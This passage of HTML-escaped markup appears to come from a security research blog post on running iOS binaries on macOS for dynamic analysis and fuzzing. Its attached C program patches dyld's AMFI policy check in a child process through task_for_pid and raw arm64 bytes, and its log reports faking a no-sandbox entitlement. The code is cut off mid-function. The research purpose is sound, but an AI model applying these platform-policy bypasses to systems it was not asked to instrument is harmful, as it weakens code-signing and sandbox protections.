interpose.dylib&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c13"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c13"&gt;&amp;gt; ./runner hello&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;[*] Preparing to execute iOS binary hello&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;[+] Child process created with pid: 48302&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;[*] Patching child process to allow dyld interposing...&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;[*] _amfi_check_dyld_policy_self at offset 0x54d94 in /usr/lib/dyld&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;[*] /usr/lib/dyld mapped at 0x1049ec000&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;[+] Successfully patched _amfi_check_dyld_policy_self&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;[*] Sending SIGCONT to continue child&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;[*] Faking no-sandbox entitlement in xpc_copy_entitlements_for_self&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;Hello from an iOS binary!&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c11"&gt;[*] Child exited with status 0&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c6"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c9" id="h.n4nfplsmx7xs"&gt;&lt;span&gt;Fuzzing&lt;/span&gt;&lt;/h2&gt; &lt;p class="c0"&gt;&lt;span&gt;With the ability to launch iOS processes, it now becomes possible to fuzz existing iOS code natively on macOS as well. I decided to use &lt;/span&gt;&lt;span class="c7"&gt;&lt;a class="c101" href="https://github.com/google/honggfuzz"&gt;Honggfuzz&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;for a simple PoC of this that also used lightweight coverage guidance (based on the &lt;/span&gt;&lt;span class="c7"&gt;&lt;a class="c101" href="https://github.com/googleprojectzero/p0tools/tree/master/TrapFuzz"&gt;Trapfuzz&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;instrumentation approach&lt;/span&gt;&lt;span&gt;). The main issue with this approach is that honggfuzz uses the combination of &lt;/span&gt;&lt;span class="c11"&gt;fork(2)&lt;/span&gt;&lt;span&gt;&amp;nbsp;followed by &lt;/span&gt;&lt;span class="c11"&gt;execve(2)&lt;/span&gt;&lt;span&gt;&amp;nbsp;to create the child processes, while also performing various operations, such as dup2&amp;rsquo;ing file descriptors, setting environment variables, etc after forking but before exec&amp;rsquo;ing. However, the iOS binary must be executed through &lt;/span&gt;&lt;span class="c11"&gt;posix_spawn&lt;/span&gt;&lt;span class="c6"&gt;, which means that these operations must be performed at some other time. Furthermore, as honggfuzz itself is still compiled for macOS, some steps of the compilation of the target binary will fail (they will attempt to link previously compiled .o files, but now the platform no longer matches) and so have to be replaced. There are certainly better ways to do this (and I encourage the reader to implement it properly), but this was the approach that I got to work the quickest. &lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c6"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;The hacky proof-of-concept patch for honggfuzz can be found &lt;/span&gt;&lt;span class="c7"&gt;&lt;a class="c101" href="https://github.com/googleprojectzero/p0tools/tree/master/iOSOnMac/honggfuzz_ios_on_mac.patch"&gt;here&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. In addition to building honggfuzz for arm64, the honggfuzz binary is subsequently signed and given the &amp;ldquo;com.apple.security.cs.debugger&amp;rdquo; entitlement in order for &lt;/span&gt;&lt;span class="c11"&gt;task_for_pid&lt;/span&gt;&lt;span class="c6"&gt;&amp;nbsp;to work.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c9" id="h.qvsv5dvirmh0"&gt;&lt;span class="c12"&gt;Conclusion&lt;/span&gt;&lt;/h2&gt; &lt;p class="c0"&gt;&lt;span class="c6"&gt;This blog post discussed how iOS apps are run on macOS and how that functionality can be used to execute any code compiled for iOS natively on macOS. This in turn can facilitate dynamic analysis and fuzzing of iOS code, and thus might make the platform a tiny bit more open for security researchers.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c6"&gt;&amp;nbsp; &lt;/span&gt;&lt;/p&gt;&lt;h2 class="c9" id="h.ptze72wmo30c"&gt;&lt;span class="c12"&gt;Attachment 1: runner.c&lt;/span&gt;&lt;/h2&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;// clang -o runner runner.c&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;// cat &amp;lt;&amp;lt;EOF &amp;gt; entitlements.xml&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;// &amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;// &amp;lt;!DOCTYPE plist PUBLIC &amp;quot;-//Apple//DTD PLIST 1.0//EN&amp;quot; &amp;quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&amp;quot;\&amp;gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;// &amp;lt;plist version=&amp;quot;1.0&amp;quot;&amp;gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;// &amp;lt;dict&amp;gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;// &amp;nbsp; &amp;nbsp; &amp;lt;key&amp;gt;com.apple.security.cs.debugger&amp;lt;/key&amp;gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;// &amp;nbsp; &amp;nbsp; &amp;lt;true/&amp;gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;// &amp;lt;/dict&amp;gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;// &amp;lt;/plist&amp;gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;// EOF&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;// # Find available code signing identities using `security find-identity`&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;// codesign -s &amp;quot;$IDENTITY&amp;quot; --entitlements entitlements.xml runner&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;//&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;#include &amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;#include &amp;lt;dlfcn.h&amp;gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;#include &amp;lt;signal.h&amp;gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;#include &amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;#include &amp;lt;spawn.h&amp;gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;#include &amp;lt;sys/wait.h&amp;gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;#include &amp;lt;mach/mach_init.h&amp;gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;#include &amp;lt;mach/vm_map.h&amp;gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;#include &amp;lt;mach/vm_page_size.h&amp;gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;#define page_align(addr) (vm_address_t)((uintptr_t)(addr) &amp;amp; (~(vm_page_size - 1)))&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;#define PLATFORM_IOS 2&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;extern char **environ;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;extern int posix_spawnattr_set_platform_np(posix_spawnattr_t*, int, int);&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;void instrument(pid_t pid) {&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; kern_return_t kr;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; task_t task;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; puts(&amp;quot;[*] Patching child process to allow dyld interposing...&amp;quot;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; // Find patch point&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; FILE* output = popen(&amp;quot;nm -arch arm64e /usr/lib/dyld &amp;nbsp;| grep _amfi_check_dyld_policy_self&amp;quot;, &amp;quot;r&amp;quot;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; unsigned int patch_offset;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; int r = fscanf(output, &amp;quot;%x t _amfi_check_dyld_policy_self&amp;quot;, &amp;amp;patch_offset);&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; if (r != 1) {&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; printf(&amp;quot;Failed to find offset of _amfi_check_dyld_policy_self in /usr/lib/dyld\n&amp;quot;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; return;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; }&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; printf(&amp;quot;[*] _amfi_check_dyld_policy_self at offset 0x%x in /usr/lib/dyld\n&amp;quot;, patch_offset);&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; // Attach to the target process&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; kr = task_for_pid(mach_task_self(), pid, &amp;amp;task);&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; if (kr != KERN_SUCCESS) {&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; printf(&amp;quot;task_for_pid failed. Is this binary signed and possesses the com.apple.security.cs.debugger entitlement?\n&amp;quot;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; return;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; }&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; vm_address_t dyld_addr = 0;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; int headers_found = 0;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; vm_address_t addr = 0;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; vm_size_t size;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; vm_region_submap_info_data_64_t info;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; mach_msg_type_number_t info_count = VM_REGION_SUBMAP_INFO_COUNT_64;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; unsigned int depth = 0;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; while (1) {&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; // get next memory region&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; kr = vm_region_recurse_64(task, &amp;amp;addr, &amp;amp;size, &amp;amp;depth, (vm_region_info_t)&amp;amp;info, &amp;amp;info_count);&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; if (kr != KERN_SUCCESS)&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; break;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; unsigned int header;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; vm_size_t bytes_read;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; kr = vm_read_overwrite(task, addr, 4, (vm_address_t)&amp;amp;header, &amp;amp;bytes_read);&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; if (kr != KERN_SUCCESS) {&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; // TODO handle this, some mappings are probably just not readable&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; printf(&amp;quot;vm_read_overwrite failed\n&amp;quot;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; return;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; }&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; if (bytes_read != 4) {&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; // TODO handle this properly&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; printf(&amp;quot;[-] vm_read read to few bytes\n&amp;quot;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; return;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; }&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; if (header == 0xfeedfacf) {&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; headers_found++;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; }&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; if (headers_found == 2) {&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; // This is dyld&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; dyld_addr = addr;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; break;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; }&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; addr += size;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; }&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; if (dyld_addr == 0) {&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; printf(&amp;quot;[-] Failed to find /usr/lib/dyld\n&amp;quot;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; return;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; }&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; printf(&amp;quot;[*] /usr/lib/dyld mapped at 0x%lx\n&amp;quot;, dyld_addr);&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; vm_address_t patch_addr = dyld_addr + patch_offset;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; // VM_PROT_COPY forces COW, probably, see vm_map_protect in vm_map.c&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; kr = vm_protect(task, page_align(patch_addr), vm_page_size, false, VM_PROT_READ | VM_PROT_WRITE | VM_PROT_COPY);&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; if (kr != KERN_SUCCESS) {&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; printf(&amp;quot;vm_protect failed\n&amp;quot;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; return;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; }&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; // MOV X8, 0x5f&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; // STR X8, [X1]&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; // RET&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; const char* code = &amp;quot;\xe8\x0b\x80\xd2\x28\x00\x00\xf9\xc0\x03\x5f\xd6&amp;quot;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; kr = vm_write(task, patch_addr, (vm_offset_t)code, 12);&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; if (kr != KERN_SUCCESS) {&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; printf(&amp;quot;vm_write failed\n&amp;quot;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; return;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; }&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; kr = vm_protect(task, page_align(patch_addr), vm_page_size, false, VM_PROT_READ | VM_PROT_EXECUTE);&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; if (kr != KERN_SUCCESS) {&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; printf(&amp;quot;vm_protect failed\n&amp;quot;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; return;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; }&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; puts(&amp;quot;[+] Successfully patched _amfi_check_dyld_policy_self&amp;quot;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;} &lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;int run(const char** argv) {&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; pid_t pid;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; int rv;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; posix_spawnattr_t attr;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; rv = posix_spawnattr_init(&amp;amp;attr);&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; if (rv != 0) {&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; perror(&amp;quot;posix_spawnattr_init&amp;quot;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; return -1;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; }&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; rv = posix_spawnattr_setflags(&amp;amp;attr, POSIX_SPAWN_START_SUSPENDED);&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; if (rv != 0) {&lt;/span&gt;&lt;/p&gt; &lt;p 